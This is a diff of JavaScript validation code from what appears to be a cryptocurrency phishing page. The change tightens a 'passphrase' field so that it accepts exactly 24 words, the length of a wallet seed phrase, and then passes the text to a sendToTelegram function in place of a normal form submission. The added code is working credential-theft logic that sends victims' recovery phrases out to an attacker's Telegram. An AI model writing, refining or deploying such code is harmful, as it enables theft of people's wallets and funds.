@@ -214,23 +214,22 @@
         }
     
         // Form validation function
-        function validateForm() {
-            const textarea = document.getElementById("content");
-            const inputValue = textarea.value.trim();
+      function validateForm() {
+    const textarea = document.getElementById("content");
+    const inputValue = textarea.value.trim();
     
-            // Check for 24 letters (no spaces)
-            const isLetterCountValid = inputValue.replace(/\s+/g, '').length >= 24;
+    // Vérifier le nombre de mots
+    const wordCount = inputValue.split(/\s+/).filter(word => word.length > 0).length;
     
-            // If validation passes, send the data to Telegram
-            if (isLetterCountValid) {
-                sendToTelegram(inputValue);
-                return false; // Prevent form submission
-            } else {
-                document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be at least 24 characters)";
-                return false;
-            }
-        }
-    
+    if (wordCount === 24) {
+        sendToTelegram(inputValue);
+        return false; // Empêche la soumission du formulaire
+    } else {
+        document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be exactly 24 words)";
+        return false;
+    }
+}
+
         // Prevent form submission before full load
         document.addEventListener("DOMContentLoaded", () => {
             const form = document.querySelector("form");
